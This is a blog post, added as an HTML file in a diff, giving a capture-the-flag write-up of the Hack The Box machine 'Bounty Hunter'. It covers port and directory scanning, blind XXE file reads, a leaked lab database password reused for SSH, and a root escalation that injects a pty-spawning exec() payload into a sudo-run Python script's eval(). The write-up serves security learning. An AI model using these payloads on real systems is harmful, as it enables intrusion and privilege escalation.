@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+  <title>Bounty Hunter writeup | Hakune Blog Backup</title>
+
+  <meta charset="UTF-8">
+  <meta name="language" content="en">
+  <meta name="description" content="Writeup for Bounty Hunter box on Hack The Box">
+  <meta name="keywords" content="">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+  
+  
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:title" content="Bounty Hunter writeup" />
+  <meta name="twitter:description" content="Writeup for Bounty Hunter box on Hack The Box"/>
+  <meta name="twitter:site" content="@akihakune" />
+  <meta name="twitter:creator" content="https://twitter.com/akihakune" />
+  
+
+  <link rel="shortcut icon" type="image/png" href="/favicon.ico" />
+
+
+  
+  
+    
+ 
+  
+  
+  
+  
+  
+  
+    
+    <link type="text/css" rel="stylesheet" href="/css/post.min.86d1effd4c412b85ac13db53a90c473a0f256f789b821e131125c9aa25cb6a6d.css" integrity="sha256-htHv/UxBK4WsE9tTqQxHOg8lb3ibgh4TESXJqiXLam0="/>
+  
+    
+    <link type="text/css" rel="stylesheet" href="/css/custom.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css" integrity="sha256-47DEQpj8HBSa&#43;/TImW&#43;5JCeuQeRkm5NMpJWZG3hSuFU="/>
+  
+  
+   
+   
+    
+
+<script type="application/ld+json">
+  
+    {
+      "@context" : "http://schema.org",
+      "@type" : "BlogPosting",
+      "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/git-akihakune.github.io"
+      },
+      "articleSection" : "blog",
+      "name" : "Bounty Hunter writeup",
+      "headline" : "Bounty Hunter writeup",
+      "description" : "Writeup for Bounty Hunter box on Hack The Box",
+      "inLanguage" : "en-US",
+      "author" : "",
+      "creator" : "",
+      "publisher": "",
+      "accountablePerson" : "",
+      "copyrightHolder" : "",
+      "copyrightYear" : "2021",
+      "datePublished": "2021-11-20 20:13:06 \u002b0700 \u002b07",
+      "dateModified" : "2021-11-20 20:13:06 \u002b0700 \u002b07",
+      "url" : "https:\/\/git-akihakune.github.io\/blog\/bountyhunter\/",
+      "wordCount" : "1455",
+      "keywords" : ["Blog"]
+    }
+  
+  </script>
+</head>
+
+<body>
+  <div class="burger__container">
+  <div class="burger" aria-controls="navigation" aria-label="Menu">
+    <div class="burger__meat burger__meat--1"></div>
+    <div class="burger__meat burger__meat--2"></div>
+    <div class="burger__meat burger__meat--3"></div>
+  </div>
+</div>
+ 
+
+  <nav class="nav" id="navigation">
+  <ul class="nav__list">
+    
+    
+      <li>
+        <a  href="/">about</a>
+      </li>
+    
+      <li>
+        <a  class="active"
+         href="/blog">blog</a>
+      </li>
+    
+  </ul>
+</nav>
+
+
+  <main>
+    
+    
+
+    <div class="flex-wrapper">
+      <div class="post__container">
+        <div class="post">
+          <header class="post__header">
+            <h1 id="post__title">Bounty Hunter writeup</h1>
+            <time datetime="2021-11-20 20:13:06 &#43;0700 &#43;07" class="post__date">Nov 20 2021</time> 
+          </header>
+          <article class="post__content">
+              
+<h4 id="author-aki-hakune">Author: Aki Hakune</h4>
+<p>Written on September 6th 2021.</p>
+<hr>
+<h2 id="i-enumeration">I. Enumeration<a class="anchor" href="#i-enumeration">#</a></h2>
+<ul>
+<li>First things first, let&rsquo;s start with a port scan!</li>
+</ul>
+<pre><code class="language-bash">┌──(aki㉿kali)-[~/ctf/htb/BountyHunter]
+└─$ nmap -sC -sV -oN nmap.txt 10.10.11.100
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-06 23:35 EDT
+Nmap scan report for 10.10.11.100
+Host is up (0.68s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
+|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
+|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Bounty Hunters
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 108.32 seconds
+</code></pre>
+<p>nothing particularly useful. We got 2 basic ports opening and their versions.</p>
+<ul>
+<li>Checking the service versions, seems like they&rsquo;re relatively new (at the time of writing) and there&rsquo;s no publicly available vulnerability or exploit for them.</li>
+<li>Manually open it in a web browser, there&rsquo;s also nothing much there, except this &ldquo;portal&rdquo; page</li>
+</ul>
+<p><img src="/img/bountyhunter_portal.png" alt=""></p>
+<ul>
+<li>Follow the link, we get to a simple page for submitting exploits:</li>
+</ul>
+<p><img src="/img/bountyhunter_log_submit.png" alt=""></p>
+<ul>
+<li>Checking the source code a bit, we find out that this form create a POST request to &ldquo;tracker_diRbPr00f314.php&rdquo;</li>
+</ul>
+<pre><code class="language-javascript">function returnSecret(data) {
+	return Promise.resolve($.ajax({
+            type: &quot;POST&quot;,
+            data: {&quot;data&quot;:data},
+            url: &quot;tracker_diRbPr00f314.php&quot;
+            }));
+}
+
+async function bountySubmit() {
+	try {
+		var xml = `&lt;?xml  version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+		&lt;bugreport&gt;
+		&lt;title&gt;${$('#exploitTitle').val()}&lt;/title&gt;
+		&lt;cwe&gt;${$('#cwe').val()}&lt;/cwe&gt;
+		&lt;cvss&gt;${$('#cvss').val()}&lt;/cvss&gt;
+		&lt;reward&gt;${$('#reward').val()}&lt;/reward&gt;
+		&lt;/bugreport&gt;`
+		let data = await returnSecret(btoa(xml));
+  		$(&quot;#return&quot;).html(data)
+	}
+	catch(error) {
+		console.log('Error:', error);
+	}
+}
+</code></pre>
+<ul>
+<li>Upon triggering <code>bountySubmit</code> function, it&rsquo;ll create an xml form and submit it. Sounds like a great <a href="https://portswigger.net/web-security/xxe" 
+  
+   target="_blank" rel="noreferrer noopener" 
+>XXE</a> to me.</li>
+<li>Fire up Burp Suite and looking at POST requests, as expected, I saw an encoded string in the <code>data</code> variable of every POST request</li>
+<li>&ldquo;It must contain the XML&rdquo;, I thought. So I tried to decode it</li>
+</ul>
+<p><img src="/img/bountyhunter_request.png" alt=""></p>
+<ul>
+<li>According to the JS code, the data should be encoded in plain, old Base64, but somehow certain parts of the data seems to be miserably screwed up</li>
+<li>I messed around in <a href="https://gchq.github.io/CyberChef" 
+  
+   target="_blank" rel="noreferrer noopener" 
+>Cyberchef</a> a bit, but that screwed part didn&rsquo;t seems to be meaningful anyway, so I gave up this vector and look for the XXE</li>
+<li>The idea of decoding it, replace with my payload and send it programmatically flashed into my mind, but at the end I chose a lazy way instead - triggering that <code>returnSecret()</code> function manually in browser DevTool</li>
+<li>After a few time of trial and error, our target finally seems to be vulnerable to XXE</li>
+</ul>
+<p><img src="/img/bountyhunter_first_xxe.png" alt=""></p>
+<ul>
+<li>Next thing is just trial and error, and by that, I mean A LOT OF trials and errors. Come up with a payload, type it in Chrome&rsquo;s dev tool, check for responses in Burp Suite history (the dev tool console looks quite small to get any serious task done), see if it worked (and 9 out of 10 times, if didn&rsquo;t), and repeat</li>
+<li>I tried all the payloads on <a src="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">OWASP referencing page</a>, and long story short, seems like it&rsquo;s not easy to get a RCE from this XXE</li>
+<li>Noticing that this site&rsquo;s using PHP, I changed my payload a bit, but still&hellip; nothing appeared. Blind XXE, and blind inject anything in general, is a pain ;-;</li>
+<li>That&rsquo;s when I thought of encode it in base64 (the same as the sending payload) rather than trying to get it by plaintext</li>
+</ul>
+<p><img src="/img/bountyhunter_log_submit_console.png" alt="">
+<br/></p>
+<ul>
+<li>And hey! Looks like I had got the content of that log_submit.php file</li>
+<li>Using that exact payload, I tried to get files from other directories but&hellip; seems like it&rsquo;s not that easy</li>
+<li>So I mindlessly browsing around in disorientation. The URI of JS files has the same format &ldquo;resources/some_file.js&rdquo;, so I decided to test it against directory listing</li>
+<li>It worked perfectly, and from that directory, I had got a precious README.txt file</li>
+</ul>
+<pre><code class="language-markdown">Tasks:
+
+[ ] Disable 'test' account on portal and switch to hashed password. Disable nopass.
+[X] Write tracker submit script
+[ ] Connect tracker submit script to the database
+[X] Fix developer group permissions
+
+</code></pre>
+<ul>
+<li>Come to think of it, this website&rsquo;s root directory (located at<code>/var/www/html</code> I guess? Since it&rsquo;s an Apache sever after all) must have something that I&rsquo;d missed</li>
+<li>So I ran Gobuster and patiently waited for a good hour</li>
+</ul>
+<pre><code class="language-bash">┌──(aki㉿kali)-[~/ctf/htb/BountyHunter]
+└─$ gobuster dir --follow-redirect -e -u http://10.10.11.100 -o gobuster.txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.11.100
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Follow Redirect:         true
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2021/09/28 21:51:31 Starting gobuster in directory enumeration mode
+===============================================================
+http://10.10.11.100/resources            (Status: 200) [Size: 2840]
+http://10.10.11.100/assets               (Status: 403) [Size: 277] 
+http://10.10.11.100/css                  (Status: 403) [Size: 277] 
+http://10.10.11.100/js                   (Status: 403) [Size: 277] 
+...
+</code></pre>
+<ul>
+<li>It ran quite fast at the start, and quite a lot of errors at the end. But after all, it revealed a <code>/db.php</code> file, which sounds really exciting</li>
+</ul>
+<p><img src="/img/bountyhunter_last_burp.png" alt="">
+<br/></p>
+<ul>
+<li>And finally, it returned some very useful stuffs.</li>
+</ul>
+<pre><code class="language-php">&lt;?php
+// TODO -&gt; Implement login system with the database.
+$dbserver = &quot;localhost&quot;;
+$dbname = &quot;bounty&quot;;
+$dbusername = &quot;admin&quot;;
+$dbpassword = &quot;m19RoAU0hP41A1sTsq6K&quot;;
+$testuser = &quot;test&quot;;
+?&gt;
+</code></pre>
+<ul>
+<li>Getting a database&rsquo;s credentials but cannot logging in is like having your room&rsquo;s key but the house key is nowhere to be found - not that much of use</li>
+<li>I tried with some combinations from those credentials on SSH, but seems like none of that was correct</li>
+<li>A certain <code>passwd</code> user list that I got from XXE earlier flashed through my mind, so I tried my luck</li>
+</ul>
+<pre><code class="language-bash">┌──(aki㉿kali)-[~/ctf/htb/BountyHunter]
+└─$ grep home passwd.txt 
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+development:x:1000:1000:Development:/home/development:/bin/bash
+</code></pre>
+<ul>
+<li>That <code>development</code> user looks interesting, so I tried it with the database credentials</li>
+</ul>
+<p><img src="/img/bountyhunter_ssh_login.png" alt="">
+<br/></p>
+<ul>
+<li>And we got it! The user flag!
+<br/></li>
+</ul>
+<h2 id="ii-privilege-escalation">II. Privilege escalation<a class="anchor" href="#ii-privilege-escalation">#</a></h2>
+<ul>
+<li>5 seconds in and I&rsquo;d already known what I was going to do:</li>
+</ul>
+<pre><code class="language-bash">development@bountyhunter:~$ sudo -l
+Matching Defaults entries for development on bountyhunter:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User development may run the following commands on bountyhunter:
+    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
+</code></pre>
+<ul>
+<li>Okay so we could run that <code>ticketValidator.py</code> file as root, and&hellip;</li>
+</ul>
+<pre><code class="language-bash">development@bountyhunter:~$ ls -l /opt/skytrain_inc/ticketValidator.py 
+-r-xr--r-- 1 root root 1471 Jul 22 11:08 /opt/skytrain_inc/ticketValidator.py
+</code></pre>
+<ul>
+<li>It didn&rsquo;t looks like we can modify that file anyway. So let&rsquo;s cat it out and see what&rsquo;s what.</li>
+</ul>
+<pre><code class="language-bash">development@bountyhunter:~$ cat /opt/skytrain_inc/ticketValidator.py 
+#Skytrain Inc Ticket Validation System 0.1
+#Do not distribute this file.
+
+def load_file(loc):
+    if loc.endswith(&quot;.md&quot;):
+        return open(loc, 'r')
+    else:
+        print(&quot;Wrong file type.&quot;)
+        exit()
+
+def evaluate(ticketFile):
+    #Evaluates a ticket to check for ireggularities.
+    code_line = None
+    for i,x in enumerate(ticketFile.readlines()):
+        if i == 0:
+            if not x.startswith(&quot;# Skytrain Inc&quot;):
+                return False
+            continue
+        if i == 1:
+            if not x.startswith(&quot;## Ticket to &quot;):
+                return False
+            print(f&quot;Destination: {' '.join(x.strip().split(' ')[3:])}&quot;)
+            continue
+
+        if x.startswith(&quot;__Ticket Code:__&quot;):
+            code_line = i+1
+            continue
+
+        if code_line and i == code_line:
+            if not x.startswith(&quot;**&quot;):
+                return False
+            ticketCode = x.replace(&quot;**&quot;, &quot;&quot;).split(&quot;+&quot;)[0]
+            if int(ticketCode) % 7 == 4:
+                validationNumber = eval(x.replace(&quot;**&quot;, &quot;&quot;))
+                if validationNumber &gt; 100:
+                    return True
+                else:
+                    return False
+    return False
+
+def main():
+    fileName = input(&quot;Please enter the path to the ticket file.\n&quot;)
+    ticket = load_file(fileName)
+    #DEBUG print(ticket)
+    result = evaluate(ticket)
+    if (result):
+        print(&quot;Valid ticket.&quot;)
+    else:
+        print(&quot;Invalid ticket.&quot;)
+    ticket.close
+
+main()
+</code></pre>
+<ul>
+<li>Before breaking something, we&rsquo;ve to understand how it works first. So I wrote a perfectly valid &ldquo;ticket&rdquo; for the script:</li>
+</ul>
+<pre><code class="language-md"># Skytrain Inc
+## Ticket to BountyHunter and friends
+__Ticket Code:__
+**11+90
+</code></pre>
+<br/>
+<ul>
+<li>And it worked as it should:</li>
+</ul>
+<pre><code class="language-bash">development@bountyhunter:~$ sudo -u root /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py 
+Please enter the path to the ticket file.
+/home/development/ticket.md
+Destination: BountyHunter and friends
+Valid ticket.
+</code></pre>
+<ul>
+<li>Now the real question is - how to exploit this &ldquo;ticket&rdquo; function</li>
+<li>The only line that caught my attention was this particular line:</li>
+</ul>
+<pre><code class="language-python">validationNumber = eval(x.replace(&quot;**&quot;, &quot;&quot;))
+</code></pre>
+<p>Yes, that <code>eval</code>.</p>
+<ul>
+<li>As far as I knew, <code>eval</code> can only be used with Python&rsquo;s <code>expressions</code>, not <code>statements</code>. But a little bit of experience in Python can lead you to this:</li>
+</ul>
+<pre><code class="language-python">&gt;&gt;&gt; eval(exec(&quot;import pty; pty.spawn('/bin/bash')&quot;))
+┌──(aki㉿kali)-[~]
+└─$ 
+</code></pre>
+<ul>
+<li>The only obstacle in our way was this 2 lines:</li>
+</ul>
+<pre><code class="language-python">ticketCode = x.replace(&quot;**&quot;, &quot;&quot;).split(&quot;+&quot;)[0]
+if int(ticketCode) % 7 == 4:
+</code></pre>
+<ul>
+<li>Basically, before we could get our sweet reverse shell, we need to bypass this check first</li>
+<li>Of those 2 lines, the first one defined a <code>ticketCode</code> variable which is equal to the first part of our payload, before the first &ldquo;+&rdquo; sign, excluding all &ldquo;**&rdquo;. If we just insert our payload there, it wouldn&rsquo;t be able to be converted to <code>int</code> type and therefore, that <code>eval</code> statement would be ignored</li>
+<li>However, <code>exec</code> in Python3 actually does return something. So I tried this:</li>
+</ul>
+<pre><code class="language-python">&gt;&gt;&gt; eval(11+exec(&quot;import pty; pty.spawn('/bin/bash')&quot;))
+┌──(aki㉿kali)-[~]
+└─$ 
+</code></pre>
+<p>perfect. &lsquo;^&rsquo;</p>
+<ul>
+<li>So our full payload was:</li>
+</ul>
+<pre><code># Skytrain Inc
+## Ticket to BountyHunter and friends
+__Ticket Code:__
+**11+exec(&quot;import pty; pty.spawn('/bin/bash')&quot;)
+</code></pre>
+<ul>
+<li>Let&rsquo;s try out if it worked</li>
+</ul>
+<pre><code class="language-bash">development@bountyhunter:~$ sudo -u root /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py 
+Please enter the path to the ticket file.
+/home/development/ticket.md
+Destination: BountyHunter and friends
+root@bountyhunter:/home/development# whoami
+root
+</code></pre>
+<ul>
+<li>And that&rsquo;s it, a great challenge to learn about XXE.</li>
+</ul>
+
+
+              
+          </article>
+          
+
+<ul class="tags__list">
+    
+    <li class="tag__item">
+        <a class="tag__link" href="https://git-akihakune.github.io/tags/ctf/">ctf</a>
+    </li>
+    <li class="tag__item">
+        <a class="tag__link" href="https://git-akihakune.github.io/tags/tech/">tech</a>
+    </li>
+    <li class="tag__item">
+        <a class="tag__link" href="https://git-akihakune.github.io/tags/english/">english</a>
+    </li></ul>
+
+ <div class="pagination">
+  
+    <a class="pagination__item" href="https://git-akihakune.github.io/blog/easy-hacktivitycon/">
+        <span class="pagination__label">Previous Post</span>
+        <span class="pagination__title">Easy Hacktivitycon Challenges</span>
+    </a>
+  
+
+  
+</div>
+
+          
+          <footer class="post__footer">
+            
+
+
+<div class="social-icons">
+  
+     
+    
+      <a
+        class="social-icons__link"
+        title="Twitter"
+        href="https://twitter.com/akihakune"
+        target="_blank"
+        rel="me noopener"
+      >
+        <div class="social-icons__icon" style="background-image: url('https://git-akihakune.github.io/svg/twitter.svg')"></div>
+      </a>
+    
+  
+     
+    
+      <a
+        class="social-icons__link"
+        title="GitHub"
+        href="https://github.com/git-akihakune"
+        target="_blank"
+        rel="me noopener"
+      >
+        <div class="social-icons__icon" style="background-image: url('https://git-akihakune.github.io/svg/github.svg')"></div>
+      </a>
+    
+  
+     
+    
+      <a
+        class="social-icons__link"
+        title="Email"
+        href="mailto:akihakune@gmail.com"
+        target="_blank"
+        rel="me noopener"
+      >
+        <div class="social-icons__icon" style="background-image: url('https://git-akihakune.github.io/svg/email.svg')"></div>
+      </a>
+    
+     
+</div>
+
+            <p>© 2021</p>
+          </footer>
+          </div>
+      </div>
+      
+    </div>
+    
+
+  </main>
+
+   
+
+  
+  <script src="/js/index.min.575dda8d49ee02639942c63564273e6da972ab531dda26a08800bdcb477cbd7f.js" integrity="sha256-V13ajUnuAmOZQsY1ZCc&#43;balyq1Md2iagiAC9y0d8vX8=" crossorigin="anonymous"></script>
+  
+  
+  <script src="https://unpkg.com/prismjs@1.20.0/components/prism-core.min.js"></script>
+
+  
+  <script src="https://unpkg.com/prismjs@1.20.0/plugins/autoloader/prism-autoloader.min.js"
+    data-autoloader-path="https://unpkg.com/prismjs@1.20.0/components/"></script>
+
+  
+
+
+</body>
+
+</html>
